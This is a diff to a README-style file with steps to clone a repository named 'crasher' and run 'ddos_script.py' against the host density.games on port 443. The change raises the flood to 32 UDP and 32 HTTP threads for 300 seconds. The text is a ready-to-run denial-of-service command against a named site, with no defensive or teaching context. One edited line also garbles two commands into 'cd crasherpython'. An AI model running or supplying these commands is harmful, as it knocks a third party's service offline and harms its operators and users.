@@ -5,8 +5,8 @@ clone this repo at
 ```text
 $Host.UI.RawUI.ForegroundColor = "Green"
 git clone https://github.com/CalcSolver/crasher.git
-cd crasher
-python ddos_script.py --host density.games --port 443 --threads 16 --duration 120
+cd crasherpython
+python ddos_script.py --host density.games --port 443 --udp-threads 32 --http-threads 32 --duration 300
 ```
 ## Executing command:
-python ddos_script.py --host density.games --port 443 --threads 16 --duration 120
+python ddos_script.py --host density.games --port 443 --udp-threads 32 --http-threads 32 --duration 300
